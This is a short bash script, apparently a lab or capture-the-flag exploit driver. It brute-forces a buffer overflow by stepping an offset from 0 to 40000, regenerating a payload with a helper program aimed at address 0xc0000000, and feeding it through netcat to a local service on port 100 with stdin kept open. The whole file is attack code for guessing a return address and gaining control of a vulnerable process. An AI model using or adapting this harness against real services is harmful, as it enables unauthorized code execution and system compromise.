#!/bin/bash

# Starting and ending numbers
start=0
end=40000
increment=100

# Try first-parameter values 
for p in {1000..1000}; do
    echo "Trying first parameter = $p"
    # Loop from start to end
    for ((i=start; i<=end; i+=increment)); do
        ./ovf32 208 24 0xc0000000 "$i"
         cat ./overflow - | nc -vv -w 2 127.0.0.1 100
    done
done
